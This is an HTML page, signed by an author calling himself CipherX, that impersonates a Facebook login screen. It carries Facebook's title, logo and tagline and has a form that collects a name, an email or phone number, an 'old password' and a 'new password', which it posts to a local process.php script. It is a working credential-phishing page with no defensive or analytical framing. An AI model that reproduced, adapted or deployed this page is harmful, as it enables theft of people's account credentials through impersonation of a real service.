<!-- by YassineDouadi(CipherX) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
<div class="box">
  <div class="title-box">
    <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
    <p>Facebook helps you connect and share with the people in your life.</p>
  </div>
  <div class="form-box">
    <form method="post" action="process.php">
      <input type="text" placeholder="Name" name="name" id="name" required>
      <input type="text" placeholder="Email address or phone number" name="phone" id="phone" required>
      <input type="password" placeholder="Old Password" name="old_password" id="old_password" required>
      <input type="password" placeholder="New Password" name="new_password" id="new_password" required>
      <button type="submit">Log In</button>
      <a href="#">Forgotten Password</a>
    </form>
    <hr>
    <div class="create-btn">
      <a href="#" target="_blank">Create New Account</a>
    </div>
  </div>
</div>
<script src="assets/script.js"></script>
</body>
</html>
